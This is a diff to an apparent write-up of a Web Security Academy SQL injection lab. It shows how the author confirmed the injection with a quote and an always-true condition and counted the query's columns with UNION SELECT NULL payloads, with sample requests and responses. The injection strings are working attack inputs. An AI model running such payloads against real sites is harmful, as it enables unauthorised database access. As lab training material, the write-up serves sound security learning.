@@ -25,33 +25,34 @@ underlying query is roughly:
 SELECT ... FROM products WHERE category = 'Gifts' AND released = 1
 ```
 
-To find the column count I appended a `UNION SELECT` with a growing list of `NULL`
-values. `NULL` is used because it is compatible with any data type, so the only thing
-that makes the query fail or succeed is the *number* of columns matching:
+First I confirmed the injection point before counting columns. Appending a single
+quote broke the query (server error), and a balanced always-true condition restored a
+valid response — proof the input lands inside the SQL string:
 
 ```
-category=Gifts'+UNION+SELECT+NULL--            → error (column count mismatch)
-category=Gifts'+UNION+SELECT+NULL,NULL--        → error
-category=Gifts'+UNION+SELECT+NULL,NULL,NULL--   → 200, extra (empty) row returned
+category=Gifts'                 → HTTP/2 500 Internal Server Error   (quote breaks the query)
+category=Gifts' AND 1=1--        → HTTP/2 200 OK                      (injection confirmed)
 ```
 
-> Evidence (replace with your captured request/response when updating):
+With the injection confirmed, I counted columns using `UNION SELECT` with `NULL`
+values. `NULL` is used because it casts to any data type, so the only thing that makes
+the query succeed or fail is the *number* of columns matching:
 
 ```http
-GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
-Host: <lab-id>.web-security-academy.net
+GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/2
+Host: 0ae1007a042377fc80ccad6c00930030.web-security-academy.net
 ```
 
 ```http
 HTTP/2 200 OK
-...
-(response renders normally, with one additional row from the injected UNION)
+Content-Length: 5190
+(response renders normally, with the injected UNION row — lab solved)
 ```
 
-The error disappeared at **three** `NULL`s, so the original query returns **3
+The query succeeded with **three** `NULL`s, so the original query returns **3
 columns**. The `--` comments out the trailing `AND released = 1` so it does not
-interfere. Lab solved. This column count is the key that unlocks the following labs:
-once you know it, you can swap a `NULL` for real data to extract it.
+interfere. This column count is the key that unlocks the following labs: once you know
+it, you swap a `NULL` for real data to extract it.
 
 ## Impact
 
